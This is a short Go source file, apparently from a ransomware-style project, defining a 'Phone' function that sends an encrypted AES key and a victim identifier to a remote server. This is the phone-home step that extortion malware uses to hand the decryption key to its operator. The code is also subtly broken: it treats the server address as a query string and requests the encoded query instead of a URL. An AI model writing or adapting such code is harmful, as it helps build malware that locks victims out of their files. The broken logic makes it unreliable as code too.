// Package home contains useful functions for reaching out to remote servers on the internet
package home

import (
	"errors"
	"net/http"
	"net/url"

	//"golang.org/x/net/proxy"
)

// Phone makes a connection to a http server somewhere on the internet and transmits the
// encrypted AES key along with some identifying information.
func Phone(u string, uid string, key string) (err error) {
	v, err := url.ParseQuery(u)
	if err != nil {
		return
	}
	v.Add("uid", uid)
	v.Add("key", key)

	resp, err := http.Get(v.Encode())
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		return errors.New("useless/home: Remote server could not be reached. Status >= 300")
	}
	return
}
